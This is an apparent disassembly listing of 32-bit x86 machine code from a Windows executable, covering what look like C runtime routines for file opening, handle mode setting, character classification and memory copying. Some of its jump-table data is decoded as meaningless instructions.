  404a07:	b8 60 b7 40 00       	mov    $0x40b760,%eax
  404a0c:	8b 15 f8 c3 40 00    	mov    0x40c3f8,%edx
  404a12:	89 04 11             	mov    %eax,(%ecx,%edx,1)
  404a15:	83 c0 20             	add    $0x20,%eax
  404a18:	83 c1 04             	add    $0x4,%ecx
  404a1b:	3d e0 b9 40 00       	cmp    $0x40b9e0,%eax
  404a20:	7c ea                	jl     0x404a0c
  404a22:	33 d2                	xor    %edx,%edx
  404a24:	b9 70 b7 40 00       	mov    $0x40b770,%ecx
  404a29:	8b c2                	mov    %edx,%eax
  404a2b:	8b f2                	mov    %edx,%esi
  404a2d:	c1 f8 05             	sar    $0x5,%eax
  404a30:	83 e6 1f             	and    $0x1f,%esi
  404a33:	8b 04 85 20 d4 40 00 	mov    0x40d420(,%eax,4),%eax
  404a3a:	8b 04 f0             	mov    (%eax,%esi,8),%eax
  404a3d:	83 f8 ff             	cmp    $0xffffffff,%eax
  404a40:	74 04                	je     0x404a46
  404a42:	85 c0                	test   %eax,%eax
  404a44:	75 03                	jne    0x404a49
  404a46:	83 09 ff             	orl    $0xffffffff,(%ecx)
  404a49:	83 c1 20             	add    $0x20,%ecx
  404a4c:	42                   	inc    %edx
  404a4d:	81 f9 d0 b7 40 00    	cmp    $0x40b7d0,%ecx
  404a53:	7c d4                	jl     0x404a29
  404a55:	5e                   	pop    %esi
  404a56:	c3                   	ret
  404a57:	e8 e0 fe ff ff       	call   0x40493c
  404a5c:	80 3d 2c c0 40 00 00 	cmpb   $0x0,0x40c02c
  404a63:	74 05                	je     0x404a6a
  404a65:	e9 88 1d 00 00       	jmp    0x4067f2
  404a6a:	c3                   	ret
  404a6b:	55                   	push   %ebp
  404a6c:	8b ec                	mov    %esp,%ebp
  404a6e:	83 ec 1c             	sub    $0x1c,%esp
  404a71:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404a74:	53                   	push   %ebx
  404a75:	33 db                	xor    %ebx,%ebx
  404a77:	56                   	push   %esi
  404a78:	f6 c1 80             	test   $0x80,%cl
  404a7b:	57                   	push   %edi
  404a7c:	c7 45 e4 0c 00 00 00 	movl   $0xc,-0x1c(%ebp)
  404a83:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  404a86:	74 09                	je     0x404a91
  404a88:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  404a8b:	c6 45 ff 10          	movb   $0x10,-0x1(%ebp)
  404a8f:	eb 0b                	jmp    0x404a9c
  404a91:	80 65 ff 00          	andb   $0x0,-0x1(%ebp)
  404a95:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  404a9c:	b8 00 80 00 00       	mov    $0x8000,%eax
  404aa1:	85 c8                	test   %ecx,%eax
  404aa3:	75 11                	jne    0x404ab6
  404aa5:	f6 c5 40             	test   $0x40,%ch
  404aa8:	75 08                	jne    0x404ab2
  404aaa:	39 05 48 c1 40 00    	cmp    %eax,0x40c148
  404ab0:	74 04                	je     0x404ab6
  404ab2:	80 4d ff 80          	orb    $0x80,-0x1(%ebp)
  404ab6:	6a 03                	push   $0x3
  404ab8:	8b c1                	mov    %ecx,%eax
  404aba:	5e                   	pop    %esi
  404abb:	23 c6                	and    %esi,%eax
  404abd:	2b c3                	sub    %ebx,%eax
  404abf:	74 2d                	je     0x404aee
  404ac1:	48                   	dec    %eax
  404ac2:	74 21                	je     0x404ae5
  404ac4:	48                   	dec    %eax
  404ac5:	74 15                	je     0x404adc
  404ac7:	c7 05 ec bf 40 00 16 	movl   $0x16,0x40bfec
  404ace:	00 00 00 
  404ad1:	89 1d f0 bf 40 00    	mov    %ebx,0x40bff0
  404ad7:	e9 25 02 00 00       	jmp    0x404d01
  404adc:	c7 45 f4 00 00 00 c0 	movl   $0xc0000000,-0xc(%ebp)
  404ae3:	eb 10                	jmp    0x404af5
  404ae5:	c7 45 f4 00 00 00 40 	movl   $0x40000000,-0xc(%ebp)
  404aec:	eb 07                	jmp    0x404af5
  404aee:	c7 45 f4 00 00 00 80 	movl   $0x80000000,-0xc(%ebp)
  404af5:	8b 45 10             	mov    0x10(%ebp),%eax
  404af8:	83 f8 10             	cmp    $0x10,%eax
  404afb:	74 26                	je     0x404b23
  404afd:	83 f8 20             	cmp    $0x20,%eax
  404b00:	74 18                	je     0x404b1a
  404b02:	83 f8 30             	cmp    $0x30,%eax
  404b05:	74 0a                	je     0x404b11
  404b07:	83 f8 40             	cmp    $0x40,%eax
  404b0a:	75 bb                	jne    0x404ac7
  404b0c:	89 75 f0             	mov    %esi,-0x10(%ebp)
  404b0f:	eb 15                	jmp    0x404b26
  404b11:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  404b18:	eb 0c                	jmp    0x404b26
  404b1a:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  404b21:	eb 03                	jmp    0x404b26
  404b23:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404b26:	ba 00 07 00 00       	mov    $0x700,%edx
  404b2b:	b8 00 04 00 00       	mov    $0x400,%eax
  404b30:	23 ca                	and    %edx,%ecx
  404b32:	bf 00 01 00 00       	mov    $0x100,%edi
  404b37:	3b c8                	cmp    %eax,%ecx
  404b39:	7f 35                	jg     0x404b70
  404b3b:	74 2e                	je     0x404b6b
  404b3d:	3b cb                	cmp    %ebx,%ecx
  404b3f:	74 2a                	je     0x404b6b
  404b41:	3b cf                	cmp    %edi,%ecx
  404b43:	74 1d                	je     0x404b62
  404b45:	81 f9 00 02 00 00    	cmp    $0x200,%ecx
  404b4b:	74 3c                	je     0x404b89
  404b4d:	81 f9 00 03 00 00    	cmp    $0x300,%ecx
  404b53:	0f 85 6e ff ff ff    	jne    0x404ac7
  404b59:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%ebp)
  404b60:	eb 37                	jmp    0x404b99
  404b62:	c7 45 f8 04 00 00 00 	movl   $0x4,-0x8(%ebp)
  404b69:	eb 2e                	jmp    0x404b99
  404b6b:	89 75 f8             	mov    %esi,-0x8(%ebp)
  404b6e:	eb 29                	jmp    0x404b99
  404b70:	81 f9 00 05 00 00    	cmp    $0x500,%ecx
  404b76:	74 1a                	je     0x404b92
  404b78:	81 f9 00 06 00 00    	cmp    $0x600,%ecx
  404b7e:	74 09                	je     0x404b89
  404b80:	3b ca                	cmp    %edx,%ecx
  404b82:	74 0e                	je     0x404b92
  404b84:	e9 3e ff ff ff       	jmp    0x404ac7
  404b89:	c7 45 f8 05 00 00 00 	movl   $0x5,-0x8(%ebp)
  404b90:	eb 07                	jmp    0x404b99
  404b92:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404b99:	8b 45 0c             	mov    0xc(%ebp),%eax
  404b9c:	be 80 00 00 00       	mov    $0x80,%esi
  404ba1:	85 c7                	test   %eax,%edi
  404ba3:	74 13                	je     0x404bb8
  404ba5:	8b 0d f4 bf 40 00    	mov    0x40bff4,%ecx
  404bab:	f7 d1                	not    %ecx
  404bad:	23 4d 14             	and    0x14(%ebp),%ecx
  404bb0:	f6 c1 80             	test   $0x80,%cl
  404bb3:	75 03                	jne    0x404bb8
  404bb5:	6a 01                	push   $0x1
  404bb7:	5e                   	pop    %esi
  404bb8:	a8 40                	test   $0x40,%al
  404bba:	74 0a                	je     0x404bc6
  404bbc:	81 ce 00 00 00 04    	or     $0x4000000,%esi
  404bc2:	80 4d f6 01          	orb    $0x1,-0xa(%ebp)
  404bc6:	f6 c4 10             	test   $0x10,%ah
  404bc9:	74 02                	je     0x404bcd
  404bcb:	0b f7                	or     %edi,%esi
  404bcd:	a8 20                	test   $0x20,%al
  404bcf:	74 08                	je     0x404bd9
  404bd1:	81 ce 00 00 00 08    	or     $0x8000000,%esi
  404bd7:	eb 0a                	jmp    0x404be3
  404bd9:	a8 10                	test   $0x10,%al
  404bdb:	74 06                	je     0x404be3
  404bdd:	81 ce 00 00 00 10    	or     $0x10000000,%esi
  404be3:	e8 73 19 00 00       	call   0x40655b
  404be8:	8b d8                	mov    %eax,%ebx
  404bea:	83 cf ff             	or     $0xffffffff,%edi
  404bed:	3b df                	cmp    %edi,%ebx
  404bef:	75 13                	jne    0x404c04
  404bf1:	83 25 f0 bf 40 00 00 	andl   $0x0,0x40bff0
  404bf8:	c7 05 ec bf 40 00 18 	movl   $0x18,0x40bfec
  404bff:	00 00 00 
  404c02:	eb 3e                	jmp    0x404c42
  404c04:	6a 00                	push   $0x0
  404c06:	56                   	push   %esi
  404c07:	ff 75 f8             	push   -0x8(%ebp)
  404c0a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404c0d:	50                   	push   %eax
  404c0e:	ff 75 f0             	push   -0x10(%ebp)
  404c11:	ff 75 f4             	push   -0xc(%ebp)
  404c14:	ff 75 08             	push   0x8(%ebp)
  404c17:	ff 15 8c 90 40 00    	call   *0x40908c
  404c1d:	8b f0                	mov    %eax,%esi
  404c1f:	3b f7                	cmp    %edi,%esi
  404c21:	74 12                	je     0x404c35
  404c23:	56                   	push   %esi
  404c24:	ff 15 88 90 40 00    	call   *0x409088
  404c2a:	85 c0                	test   %eax,%eax
  404c2c:	75 1b                	jne    0x404c49
  404c2e:	56                   	push   %esi
  404c2f:	ff 15 70 90 40 00    	call   *0x409070
  404c35:	ff 15 6c 90 40 00    	call   *0x40906c
  404c3b:	50                   	push   %eax
  404c3c:	e8 b3 18 00 00       	call   0x4064f4
  404c41:	59                   	pop    %ecx
  404c42:	8b c7                	mov    %edi,%eax
  404c44:	e9 d6 00 00 00       	jmp    0x404d1f
  404c49:	83 f8 02             	cmp    $0x2,%eax
  404c4c:	75 06                	jne    0x404c54
  404c4e:	80 4d ff 40          	orb    $0x40,-0x1(%ebp)
  404c52:	eb 09                	jmp    0x404c5d
  404c54:	83 f8 03             	cmp    $0x3,%eax
  404c57:	75 04                	jne    0x404c5d
  404c59:	80 4d ff 08          	orb    $0x8,-0x1(%ebp)
  404c5d:	56                   	push   %esi
  404c5e:	53                   	push   %ebx
  404c5f:	e8 8c 19 00 00       	call   0x4065f0
  404c64:	59                   	pop    %ecx
  404c65:	8a 45 ff             	mov    -0x1(%ebp),%al
  404c68:	59                   	pop    %ecx
  404c69:	8b f3                	mov    %ebx,%esi
  404c6b:	8b cb                	mov    %ebx,%ecx
  404c6d:	0c 01                	or     $0x1,%al
  404c6f:	c1 f9 05             	sar    $0x5,%ecx
  404c72:	83 e6 1f             	and    $0x1f,%esi
  404c75:	88 45 0b             	mov    %al,0xb(%ebp)
  404c78:	8d 3c 8d 20 d4 40 00 	lea    0x40d420(,%ecx,4),%edi
  404c7f:	c1 e6 03             	shl    $0x3,%esi
  404c82:	8b 0f                	mov    (%edi),%ecx
  404c84:	80 65 0b 48          	andb   $0x48,0xb(%ebp)
  404c88:	88 44 31 04          	mov    %al,0x4(%ecx,%esi,1)
  404c8c:	75 78                	jne    0x404d06
  404c8e:	a8 80                	test   $0x80,%al
  404c90:	74 74                	je     0x404d06
  404c92:	f6 45 0c 02          	testb  $0x2,0xc(%ebp)
  404c96:	74 6e                	je     0x404d06
  404c98:	6a 02                	push   $0x2
  404c9a:	6a ff                	push   $0xffffffff
  404c9c:	53                   	push   %ebx
  404c9d:	e8 7b f6 ff ff       	call   0x40431d
  404ca2:	83 c4 0c             	add    $0xc,%esp
  404ca5:	83 f8 ff             	cmp    $0xffffffff,%eax
  404ca8:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404cab:	75 0e                	jne    0x404cbb
  404cad:	81 3d f0 bf 40 00 83 	cmpl   $0x83,0x40bff0
  404cb4:	00 00 00 
  404cb7:	74 4d                	je     0x404d06
  404cb9:	eb 3f                	jmp    0x404cfa
  404cbb:	80 65 13 00          	andb   $0x0,0x13(%ebp)
  404cbf:	8d 45 13             	lea    0x13(%ebp),%eax
  404cc2:	6a 01                	push   $0x1
  404cc4:	50                   	push   %eax
  404cc5:	53                   	push   %ebx
  404cc6:	e8 5c f4 ff ff       	call   0x404127
  404ccb:	83 c4 0c             	add    $0xc,%esp
  404cce:	85 c0                	test   %eax,%eax
  404cd0:	75 16                	jne    0x404ce8
  404cd2:	80 7d 13 1a          	cmpb   $0x1a,0x13(%ebp)
  404cd6:	75 10                	jne    0x404ce8
  404cd8:	ff 75 f0             	push   -0x10(%ebp)
  404cdb:	53                   	push   %ebx
  404cdc:	e8 69 1b 00 00       	call   0x40684a
  404ce1:	59                   	pop    %ecx
  404ce2:	83 f8 ff             	cmp    $0xffffffff,%eax
  404ce5:	59                   	pop    %ecx
  404ce6:	74 12                	je     0x404cfa
  404ce8:	6a 00                	push   $0x0
  404cea:	6a 00                	push   $0x0
  404cec:	53                   	push   %ebx
  404ced:	e8 2b f6 ff ff       	call   0x40431d
  404cf2:	83 c4 0c             	add    $0xc,%esp
  404cf5:	83 f8 ff             	cmp    $0xffffffff,%eax
  404cf8:	75 0c                	jne    0x404d06
  404cfa:	53                   	push   %ebx
  404cfb:	e8 c7 f1 ff ff       	call   0x403ec7
  404d00:	59                   	pop    %ecx
  404d01:	83 c8 ff             	or     $0xffffffff,%eax
  404d04:	eb 19                	jmp    0x404d1f
  404d06:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  404d0a:	75 11                	jne    0x404d1d
  404d0c:	f6 45 0c 08          	testb  $0x8,0xc(%ebp)
  404d10:	74 0b                	je     0x404d1d
  404d12:	8b 07                	mov    (%edi),%eax
  404d14:	80 4c 30 04 20       	orb    $0x20,0x4(%eax,%esi,1)
  404d19:	8d 44 30 04          	lea    0x4(%eax,%esi,1),%eax
  404d1d:	8b c3                	mov    %ebx,%eax
  404d1f:	5f                   	pop    %edi
  404d20:	5e                   	pop    %esi
  404d21:	5b                   	pop    %ebx
  404d22:	c9                   	leave
  404d23:	c3                   	ret
  404d24:	8b 44 24 04          	mov    0x4(%esp),%eax
  404d28:	56                   	push   %esi
  404d29:	3b 05 20 d5 40 00    	cmp    0x40d520,%eax
  404d2f:	73 5a                	jae    0x404d8b
  404d31:	8b c8                	mov    %eax,%ecx
  404d33:	83 e0 1f             	and    $0x1f,%eax
  404d36:	c1 f9 05             	sar    $0x5,%ecx
  404d39:	8b 0c 8d 20 d4 40 00 	mov    0x40d420(,%ecx,4),%ecx
  404d40:	8d 54 c1 04          	lea    0x4(%ecx,%eax,8),%edx
  404d44:	8a 4c c1 04          	mov    0x4(%ecx,%eax,8),%cl
  404d48:	f6 c1 01             	test   $0x1,%cl
  404d4b:	74 3e                	je     0x404d8b
  404d4d:	8a c1                	mov    %cl,%al
  404d4f:	be 00 80 00 00       	mov    $0x8000,%esi
  404d54:	25 80 00 00 00       	and    $0x80,%eax
  404d59:	39 74 24 0c          	cmp    %esi,0xc(%esp)
  404d5d:	75 05                	jne    0x404d64
  404d5f:	80 e1 7f             	and    $0x7f,%cl
  404d62:	eb 0d                	jmp    0x404d71
  404d64:	81 7c 24 0c 00 40 00 	cmpl   $0x4000,0xc(%esp)
  404d6b:	00 
  404d6c:	75 11                	jne    0x404d7f
  404d6e:	80 c9 80             	or     $0x80,%cl
  404d71:	f7 d8                	neg    %eax
  404d73:	1b c0                	sbb    %eax,%eax
  404d75:	88 0a                	mov    %cl,(%edx)
  404d77:	66 25 00 c0          	and    $0xc000,%ax
  404d7b:	03 c6                	add    %esi,%eax
  404d7d:	5e                   	pop    %esi
  404d7e:	c3                   	ret
  404d7f:	c7 05 ec bf 40 00 16 	movl   $0x16,0x40bfec
  404d86:	00 00 00 
  404d89:	eb 0a                	jmp    0x404d95
  404d8b:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  404d92:	00 00 00 
  404d95:	83 c8 ff             	or     $0xffffffff,%eax
  404d98:	5e                   	pop    %esi
  404d99:	c3                   	ret
  404d9a:	83 3d 94 be 40 00 01 	cmpl   $0x1,0x40be94
  404da1:	7e 0e                	jle    0x404db1
  404da3:	6a 08                	push   $0x8
  404da5:	ff 74 24 08          	push   0x8(%esp)
  404da9:	e8 e2 1b 00 00       	call   0x406990
  404dae:	59                   	pop    %ecx
  404daf:	59                   	pop    %ecx
  404db0:	c3                   	ret
  404db1:	8b 44 24 04          	mov    0x4(%esp),%eax
  404db5:	8b 0d 88 bc 40 00    	mov    0x40bc88,%ecx
  404dbb:	8a 04 41             	mov    (%ecx,%eax,2),%al
  404dbe:	83 e0 08             	and    $0x8,%eax
  404dc1:	c3                   	ret
  404dc2:	6a 19                	push   $0x19
  404dc4:	e8 84 f0 ff ff       	call   0x403e4d
  404dc9:	59                   	pop    %ecx
  404dca:	c3                   	ret
  404dcb:	cc                   	int3
  404dcc:	cc                   	int3
  404dcd:	cc                   	int3
  404dce:	cc                   	int3
  404dcf:	cc                   	int3
  404dd0:	55                   	push   %ebp
  404dd1:	8b ec                	mov    %esp,%ebp
  404dd3:	57                   	push   %edi
  404dd4:	56                   	push   %esi
  404dd5:	8b 75 0c             	mov    0xc(%ebp),%esi
  404dd8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404ddb:	8b 7d 08             	mov    0x8(%ebp),%edi
  404dde:	8b c1                	mov    %ecx,%eax
  404de0:	8b d1                	mov    %ecx,%edx
  404de2:	03 c6                	add    %esi,%eax
  404de4:	3b fe                	cmp    %esi,%edi
  404de6:	76 08                	jbe    0x404df0
  404de8:	3b f8                	cmp    %eax,%edi
  404dea:	0f 82 78 01 00 00    	jb     0x404f68
  404df0:	f7 c7 03 00 00 00    	test   $0x3,%edi
  404df6:	75 14                	jne    0x404e0c
  404df8:	c1 e9 02             	shr    $0x2,%ecx
  404dfb:	83 e2 03             	and    $0x3,%edx
  404dfe:	83 f9 08             	cmp    $0x8,%ecx
  404e01:	72 29                	jb     0x404e2c
  404e03:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404e05:	ff 24 95 18 4f 40 00 	jmp    *0x404f18(,%edx,4)
  404e0c:	8b c7                	mov    %edi,%eax
  404e0e:	ba 03 00 00 00       	mov    $0x3,%edx
  404e13:	83 e9 04             	sub    $0x4,%ecx
  404e16:	72 0c                	jb     0x404e24
  404e18:	83 e0 03             	and    $0x3,%eax
  404e1b:	03 c8                	add    %eax,%ecx
  404e1d:	ff 24 85 30 4e 40 00 	jmp    *0x404e30(,%eax,4)
  404e24:	ff 24 8d 28 4f 40 00 	jmp    *0x404f28(,%ecx,4)
  404e2b:	90                   	nop
  404e2c:	ff 24 8d ac 4e 40 00 	jmp    *0x404eac(,%ecx,4)
  404e33:	90                   	nop
  404e34:	40                   	inc    %eax
  404e35:	4e                   	dec    %esi
  404e36:	40                   	inc    %eax
  404e37:	00 6c 4e 40          	add    %ch,0x40(%esi,%ecx,2)
  404e3b:	00 90 4e 40 00 23    	add    %dl,0x2300404e(%eax)
  404e41:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  404e47:	46                   	inc    %esi
  404e48:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  404e4e:	02 c1                	add    %cl,%al
  404e50:	e9 02 88 47 02       	jmp    0x287d657
  404e55:	83 c6 03             	add    $0x3,%esi
  404e58:	83 c7 03             	add    $0x3,%edi
  404e5b:	83 f9 08             	cmp    $0x8,%ecx
  404e5e:	72 cc                	jb     0x404e2c
  404e60:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404e62:	ff 24 95 18 4f 40 00 	jmp    *0x404f18(,%edx,4)
  404e69:	8d 49 00             	lea    0x0(%ecx),%ecx
  404e6c:	23 d1                	and    %ecx,%edx
  404e6e:	8a 06                	mov    (%esi),%al
  404e70:	88 07                	mov    %al,(%edi)
  404e72:	8a 46 01             	mov    0x1(%esi),%al
  404e75:	c1 e9 02             	shr    $0x2,%ecx
  404e78:	88 47 01             	mov    %al,0x1(%edi)
  404e7b:	83 c6 02             	add    $0x2,%esi
  404e7e:	83 c7 02             	add    $0x2,%edi
  404e81:	83 f9 08             	cmp    $0x8,%ecx
  404e84:	72 a6                	jb     0x404e2c
  404e86:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404e88:	ff 24 95 18 4f 40 00 	jmp    *0x404f18(,%edx,4)
  404e8f:	90                   	nop
  404e90:	23 d1                	and    %ecx,%edx
  404e92:	8a 06                	mov    (%esi),%al
  404e94:	88 07                	mov    %al,(%edi)
  404e96:	46                   	inc    %esi
  404e97:	c1 e9 02             	shr    $0x2,%ecx
  404e9a:	47                   	inc    %edi
  404e9b:	83 f9 08             	cmp    $0x8,%ecx
  404e9e:	72 8c                	jb     0x404e2c
  404ea0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404ea2:	ff 24 95 18 4f 40 00 	jmp    *0x404f18(,%edx,4)
  404ea9:	8d 49 00             	lea    0x0(%ecx),%ecx
  404eac:	0f 4f 40 00          	cmovg  0x0(%eax),%eax
  404eb0:	fc                   	cld
  404eb1:	4e                   	dec    %esi
  404eb2:	40                   	inc    %eax
  404eb3:	00 f4                	add    %dh,%ah
  404eb5:	4e                   	dec    %esi
  404eb6:	40                   	inc    %eax
  404eb7:	00 ec                	add    %ch,%ah
  404eb9:	4e                   	dec    %esi
  404eba:	40                   	inc    %eax
  404ebb:	00 e4                	add    %ah,%ah
  404ebd:	4e                   	dec    %esi
  404ebe:	40                   	inc    %eax
  404ebf:	00 dc                	add    %bl,%ah
  404ec1:	4e                   	dec    %esi
  404ec2:	40                   	inc    %eax
  404ec3:	00 d4                	add    %dl,%ah
  404ec5:	4e                   	dec    %esi
  404ec6:	40                   	inc    %eax
  404ec7:	00 cc                	add    %cl,%ah
  404ec9:	4e                   	dec    %esi
  404eca:	40                   	inc    %eax
  404ecb:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  404ed1:	44                   	inc    %esp
  404ed2:	8f                   	(bad)
  404ed3:	e4 8b                	in     $0x8b,%al
  404ed5:	44                   	inc    %esp
  404ed6:	8e e8                	mov    %eax,%gs
  404ed8:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  404edc:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  404ee0:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  404ee4:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  404ee8:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  404eec:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  404ef0:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  404ef4:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  404ef8:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  404efc:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  404f00:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  404f04:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  404f0b:	03 f0                	add    %eax,%esi
  404f0d:	03 f8                	add    %eax,%edi
  404f0f:	ff 24 95 18 4f 40 00 	jmp    *0x404f18(,%edx,4)
  404f16:	8b ff                	mov    %edi,%edi
  404f18:	28 4f 40             	sub    %cl,0x40(%edi)
  404f1b:	00 30                	add    %dh,(%eax)
  404f1d:	4f                   	dec    %edi
  404f1e:	40                   	inc    %eax
  404f1f:	00 3c 4f             	add    %bh,(%edi,%ecx,2)
  404f22:	40                   	inc    %eax
  404f23:	00 50 4f             	add    %dl,0x4f(%eax)
  404f26:	40                   	inc    %eax
  404f27:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  404f2d:	c9                   	leave
  404f2e:	c3                   	ret
  404f2f:	90                   	nop
  404f30:	8a 06                	mov    (%esi),%al
  404f32:	88 07                	mov    %al,(%edi)
  404f34:	8b 45 08             	mov    0x8(%ebp),%eax
  404f37:	5e                   	pop    %esi
  404f38:	5f                   	pop    %edi
  404f39:	c9                   	leave
  404f3a:	c3                   	ret
  404f3b:	90                   	nop
  404f3c:	8a 06                	mov    (%esi),%al
  404f3e:	88 07                	mov    %al,(%edi)
  404f40:	8a 46 01             	mov    0x1(%esi),%al
  404f43:	88 47 01             	mov    %al,0x1(%edi)
  404f46:	8b 45 08             	mov    0x8(%ebp),%eax
  404f49:	5e                   	pop    %esi
  404f4a:	5f                   	pop    %edi
  404f4b:	c9                   	leave
  404f4c:	c3                   	ret
  404f4d:	8d 49 00             	lea    0x0(%ecx),%ecx
  404f50:	8a 06                	mov    (%esi),%al
  404f52:	88 07                	mov    %al,(%edi)
  404f54:	8a 46 01             	mov    0x1(%esi),%al
  404f57:	88 47 01             	mov    %al,0x1(%edi)
  404f5a:	8a 46 02             	mov    0x2(%esi),%al
  404f5d:	88 47 02             	mov    %al,0x2(%edi)
  404f60:	8b 45 08             	mov    0x8(%ebp),%eax
  404f63:	5e                   	pop    %esi
  404f64:	5f                   	pop    %edi
  404f65:	c9                   	leave
  404f66:	c3                   	ret
  404f67:	90                   	nop
  404f68:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  404f6c:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  404f70:	f7 c7 03 00 00 00    	test   $0x3,%edi
  404f76:	75 24                	jne    0x404f9c
  404f78:	c1 e9 02             	shr    $0x2,%ecx
  404f7b:	83 e2 03             	and    $0x3,%edx
  404f7e:	83 f9 08             	cmp    $0x8,%ecx
  404f81:	72 0d                	jb     0x404f90
  404f83:	fd                   	std
  404f84:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404f86:	fc                   	cld
  404f87:	ff 24 95 b0 50 40 00 	jmp    *0x4050b0(,%edx,4)
  404f8e:	8b ff                	mov    %edi,%edi
  404f90:	f7 d9                	neg    %ecx
  404f92:	ff 24 8d 60 50 40 00 	jmp    *0x405060(,%ecx,4)
  404f99:	8d 49 00             	lea    0x0(%ecx),%ecx
  404f9c:	8b c7                	mov    %edi,%eax
  404f9e:	ba 03 00 00 00       	mov    $0x3,%edx
  404fa3:	83 f9 04             	cmp    $0x4,%ecx
  404fa6:	72 0c                	jb     0x404fb4
  404fa8:	83 e0 03             	and    $0x3,%eax
  404fab:	2b c8                	sub    %eax,%ecx
  404fad:	ff 24 85 b8 4f 40 00 	jmp    *0x404fb8(,%eax,4)
  404fb4:	ff 24 8d b0 50 40 00 	jmp    *0x4050b0(,%ecx,4)
  404fbb:	90                   	nop
  404fbc:	c8 4f 40 00          	enter  $0x404f,$0x0
  404fc0:	e8 4f 40 00 10       	call   0x10409014
  404fc5:	50                   	push   %eax
  404fc6:	40                   	inc    %eax
  404fc7:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  404fcd:	88 47 03             	mov    %al,0x3(%edi)
  404fd0:	4e                   	dec    %esi
  404fd1:	c1 e9 02             	shr    $0x2,%ecx
  404fd4:	4f                   	dec    %edi
  404fd5:	83 f9 08             	cmp    $0x8,%ecx
  404fd8:	72 b6                	jb     0x404f90
  404fda:	fd                   	std
  404fdb:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404fdd:	fc                   	cld
  404fde:	ff 24 95 b0 50 40 00 	jmp    *0x4050b0(,%edx,4)
  404fe5:	8d 49 00             	lea    0x0(%ecx),%ecx
  404fe8:	8a 46 03             	mov    0x3(%esi),%al
  404feb:	23 d1                	and    %ecx,%edx
  404fed:	88 47 03             	mov    %al,0x3(%edi)
  404ff0:	8a 46 02             	mov    0x2(%esi),%al
  404ff3:	c1 e9 02             	shr    $0x2,%ecx
  404ff6:	88 47 02             	mov    %al,0x2(%edi)
  404ff9:	83 ee 02             	sub    $0x2,%esi
  404ffc:	83 ef 02             	sub    $0x2,%edi
  404fff:	83 f9 08             	cmp    $0x8,%ecx
  405002:	72 8c                	jb     0x404f90
  405004:	fd                   	std
  405005:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405007:	fc                   	cld
  405008:	ff 24 95 b0 50 40 00 	jmp    *0x4050b0(,%edx,4)
  40500f:	90                   	nop
  405010:	8a 46 03             	mov    0x3(%esi),%al
  405013:	23 d1                	and    %ecx,%edx
  405015:	88 47 03             	mov    %al,0x3(%edi)
  405018:	8a 46 02             	mov    0x2(%esi),%al
  40501b:	88 47 02             	mov    %al,0x2(%edi)
  40501e:	8a 46 01             	mov    0x1(%esi),%al
  405021:	c1 e9 02             	shr    $0x2,%ecx
  405024:	88 47 01             	mov    %al,0x1(%edi)
  405027:	83 ee 03             	sub    $0x3,%esi
  40502a:	83 ef 03             	sub    $0x3,%edi
  40502d:	83 f9 08             	cmp    $0x8,%ecx
  405030:	0f 82 5a ff ff ff    	jb     0x404f90
  405036:	fd                   	std
  405037:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405039:	fc                   	cld
  40503a:	ff 24 95 b0 50 40 00 	jmp    *0x4050b0(,%edx,4)
  405041:	8d 49 00             	lea    0x0(%ecx),%ecx
  405044:	64 50                	fs push %eax
  405046:	40                   	inc    %eax
  405047:	00 6c 50 40          	add    %ch,0x40(%eax,%edx,2)
  40504b:	00 74 50 40          	add    %dh,0x40(%eax,%edx,2)
  40504f:	00 7c 50 40          	add    %bh,0x40(%eax,%edx,2)
  405053:	00 84 50 40 00 8c 50 	add    %al,0x508c0040(%eax,%edx,2)
  40505a:	40                   	inc    %eax
  40505b:	00 94 50 40 00 a7 50 	add    %dl,0x50a70040(%eax,%edx,2)
  405062:	40                   	inc    %eax
  405063:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  405069:	44                   	inc    %esp
  40506a:	8f                   	(bad)
  40506b:	1c 8b                	sbb    $0x8b,%al
  40506d:	44                   	inc    %esp
  40506e:	8e 18                	mov    (%eax),%ds
  405070:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
